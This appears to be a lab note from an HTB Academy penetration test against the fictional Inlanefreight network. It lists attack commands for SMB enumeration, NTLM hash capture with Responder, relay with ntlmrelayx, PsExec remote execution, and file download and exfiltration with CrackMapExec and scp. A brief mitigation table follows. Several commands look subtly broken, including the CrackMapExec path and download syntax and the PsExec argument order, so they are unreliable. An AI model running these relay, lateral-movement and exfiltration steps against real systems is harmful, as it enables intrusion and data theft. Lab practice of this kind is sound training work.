# 🎯 Attack Path Documentation

> [!ABSTRACT] 
> This document provides a detailed attack path for the Inlanefreight penetration test in HTB Academy, including methodologies, findings, and technical steps.

---

## 🌍 Initial Reconnaissance & Enumeration

### Nmap Scan

```bash
nmap -sC -sV <IP>
```

> [!NOTE] 
> Ensure you have an up-to-date NSE scripts database for accurate service version detection.

---

## 🔐 Service Discovery

### SMB Enumeration

#### nbtstat

Anonymous:

```text
nbtstat -A <IP>
```

Authenticated:

```bash
[[CrackMapExec]] smb //<IP>/IPC$ -u admin -p 'password'
```

> [!WARNING] 
> Always be cautious when running authentication commands with real credentials.

---

## 🛠 Exploitation & Privilege Escalation

### SMB Relay Attack Setup

Capture NTLM hashes:

```bash
sudo responder -I tun0
```

Relay captured hashes to internal services:

```bash
impacket-ntlmrelayx \
-smb2support \
-t smb://<IP>
```

> [!DANGER] 
> Ensure that target systems do not have SMB signing enabled.

---

## 🗄️ Lateral Movement & Data Exfiltration

### PsExec Usage for Remote Command Execution

```bash
[[PsExec]] -s -i cmd.exe \\192.168.10.5
```

> [!SUCCESS]
> Successful execution indicates full control over the remote machine.

---

## 📑 Documentation & Reporting

### Artifact Capture

#### File Downloads via SMB

Download files from a compromised system:

```bash
[[CrackMapExec]] smb <IP> -d sharename -u user -p 'password' download path/to/file.txt
```

Transfer sensitive data securely:

```text
scp file.txt user@<IP>:path/
```

---

## ⚠️ Common Findings & Mitigation Strategies

| Finding | Mitigation |
|---|---|
| SMB Relay Attack Success | Enable SMB signing, restrict access to internal network segments. |
| Lateral Movement via PsExec | Implement network segmentation and monitor for unusual external command execution requests. |

> [!CAUTION] 
> Ensure proper documentation of all findings and recommendations in the final report.

---

## 🧠 Mental Model Summary

```text
Initial Reconnaissance → Service Discovery → Exploitation & Escalation → Lateral Movement → Data Exfiltration → Reporting
```

This structured approach ensures comprehensive coverage of attack vectors and effective reporting.